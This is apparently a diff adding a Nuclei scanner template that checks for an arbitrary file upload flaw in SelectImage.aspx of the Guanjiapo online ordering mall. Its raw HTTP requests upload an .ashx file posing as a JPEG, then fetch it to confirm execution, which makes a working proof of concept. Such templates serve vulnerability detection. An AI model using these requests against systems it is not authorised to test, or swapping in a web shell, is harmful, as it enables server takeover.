@@ -1,0 +1,51 @@
+id: gjp-selectimage-file-upload
+info:
+  name: GJP SelectImage.aspx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is an arbitrary file upload vulnerability in the Guanjiapo Ordering Online Mall's SelectImage.aspx. An attacker can use this vulnerability to control the system.
+  reference:
+    - http://www.grasp.com.cn/
+  classification:
+    cvss-score: 9.8
+  tags: file-upload
+
+http:
+  - raw:
+      - |
+        POST /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b
+
+        --532c7611457d40f4ae4cd9422973416b
+        Content-Disposition: form-data; name="Filedata"; filename="123.ashx"
+        Content-Type: image/jpeg
+
+        <%= "test" %>
+        --532c7611457d40f4ae4cd9422973416b--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - raw:
+      - |
+        GET /uploads/123.ashx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
